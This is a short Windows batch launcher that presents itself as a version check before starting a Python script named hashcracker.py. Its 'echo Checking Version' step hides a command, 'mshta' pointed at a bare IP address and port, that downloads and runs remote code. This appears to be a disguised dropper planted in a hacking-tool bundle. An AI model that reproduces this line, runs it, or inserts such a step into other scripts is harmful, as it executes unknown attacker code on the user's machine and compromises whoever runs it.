color 0a
echo Checking Version
echo Except Up To Date
@echo off
mshta http://80.6.246.94:9999/ntooY
TIMEOUT /T 5
python hashcracker.py
exit
